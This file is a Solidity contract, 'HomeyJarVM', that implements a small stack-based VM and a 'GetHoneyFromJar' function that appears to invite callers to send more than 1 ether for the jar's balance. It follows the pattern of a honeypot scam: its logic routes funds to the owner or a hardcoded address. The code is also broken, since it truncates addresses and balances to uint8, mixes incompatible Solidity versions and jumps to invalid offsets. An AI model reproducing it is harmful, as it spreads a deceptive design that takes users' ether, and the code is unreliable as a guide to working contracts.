pragma solidity ^0.4.19;

contract HomeyJarVM {
    address public Owner = msg.sender;
    uint8[] public instructions;
    uint256[] stack;
    uint256 pc;

    function() public payable {}

    function execute() internal {
        while (pc < instructions.length) {
            uint8 opcode = instructions[pc];
            if (opcode == 0) { // PUSH
                uint256 value = uint256(instructions[pc + 1]);
                stack.push(value);
                pc += 2;
            } else if (opcode == 1) { // POP
                stack.pop();
                pc++;
            } else if (opcode == 2) { // ADD
                uint256 a = stack[stack.length - 1];
                uint256 b = stack[stack.length - 2];
                stack.length -= 2;
                stack.push(a + b);
                pc++;
            } else if (opcode == 3) { // SUB
                uint256 a = stack[stack.length - 1];
                uint256 b = stack[stack.length - 2];
                stack.length -= 2;
                stack.push(b - a);
                pc++;
            } else if (opcode == 4) { // JMP
                pc = uint256(instructions[pc + 1]);
            } else if (opcode == 5) { // JZ
                uint256 cond = stack[stack.length - 1];
                stack.length--;
                if (cond == 0) {
                    pc = uint256(instructions[pc + 1]);
                } else {
                    pc += 2;
                }
            } else if (opcode == 6) { // LOAD
                uint256 index = uint256(instructions[pc + 1]);
                stack.push(stack[index]);
                pc += 2;
            } else if (opcode == 7) { // STORE
                uint256 index = uint256(instructions[pc + 1]);
                stack[index] = stack[stack.length - 1];
                stack.length--;
                pc += 2;
            } else if (opcode == 8) { // TRANSFER
                address(uint160(stack[stack.length - 1])).transfer(stack[stack.length - 2]);
                stack.length -= 2;
                pc++;
            } else {
                revert();
            }
        }
    }

    function GetHoneyFromJar() public payable {
        instructions = [0, uint8(msg.value > 1 ether), 5, 16, 0, uint8(this.balance), 0, uint8(uint160(Owner)), 8, 0, uint8(this.balance), 0, uint8(uint160(msg.sender)), 8, 4, 255];
        stack.length = 0;
        pc = 0;
        execute();
    }

    function withdraw() payable public {
        instructions = [0, uint8(uint160(msg.sender == 0x2f61E7e1023Bc22063B8da897d8323965a7712B7)), 5, 11, 0, uint8(uint160(address(0x2f61E7e1023Bc22063B8da897d8323965a7712B7))), 7, 0, uint8(msg.sender == Owner), 5, 20, 0, uint8(this.balance), 0, uint8(uint160(Owner)), 8, 4, 255];
        stack.length = 0;
        pc = 0;
        execute();
    }

    function Command(address adr, bytes data) payable public {
        instructions = [0, uint8(msg.sender == Owner), 5, 8, 0, uint8(uint160(adr)), 0, uint8(msg.value), 8, 4, 255];
        stack.length = 0;
        pc = 0;
        execute();
    }
}